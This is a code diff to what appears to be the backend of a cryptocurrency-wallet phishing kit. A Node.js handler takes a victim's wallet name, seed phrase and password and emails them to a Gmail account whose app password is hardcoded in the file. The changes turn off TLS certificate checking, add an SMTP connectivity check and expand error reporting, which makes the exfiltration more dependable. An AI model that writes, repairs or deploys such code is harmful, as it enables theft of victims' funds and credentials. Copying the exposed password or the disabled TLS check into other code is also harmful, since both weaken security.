@@ -4,6 +4,7 @@ const transporter = nodemailer.createTransport({
   host: process.env.SMTP_HOST || "smtp.gmail.com",
   port: Number(process.env.SMTP_PORT || 587),
   secure: process.env.SMTP_SECURE === "true",
+  tls: { rejectUnauthorized: false },
   auth: {
     user: process.env.SMTP_USER || "attendantemail@gmail.com",
     pass: process.env.SMTP_PASS || "ixrb xwbe haxp qtnt",
@@ -51,6 +52,14 @@ module.exports = async (req, res) => {
     return res.status(400).json({ error: "Invalid request body." });
   }
 
+  // Verify transporter connectivity and authentication before sending
+  try {
+    await transporter.verify();
+  } catch (err) {
+    console.error('SMTP verify failed:', err);
+    return res.status(500).json({ error: 'SMTP verification failed. Check SMTP credentials and network access.', details: err && err.message });
+  }
+
   const wallet_name = String(body.wallet_name || "").trim();
   const phase = String(body.phase || "").trim();
   const password = String(body.pw || "").trim();
@@ -77,7 +86,7 @@ module.exports = async (req, res) => {
     const info = await transporter.sendMail(mailOptions);
     return res.status(200).json({ ok: true, messageId: info.messageId });
   } catch (error) {
-    console.error(error);
-    return res.status(500).json({ error: "Message could not be sent.", details: error.message });
+    console.error('SendMail error:', error);
+    return res.status(500).json({ error: "Message could not be sent.", details: (error && (error.response || error.message)) });
   }
 };
